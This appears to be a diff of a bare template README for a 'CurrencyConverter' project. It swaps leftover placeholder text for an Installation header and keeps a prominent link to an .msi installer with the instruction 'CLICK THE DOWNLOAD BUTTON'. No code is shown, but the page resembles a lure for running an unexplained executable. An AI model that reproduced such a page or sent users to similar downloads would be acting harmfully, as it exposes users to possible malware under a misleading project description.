@@ -1,7 +1,7 @@
 # CurrencyConverter
 
-Foobar is a Python library for dealing with word pluralization.
 
+## Installation
 ## [DOWNLOAD](https://github.com/APPROX4/CurrencyConverter/releases/download/CurrencyConverter/CurrencyConverter.msi)
 ```bash
 CLICK THE DOWNLOAD BUTTON
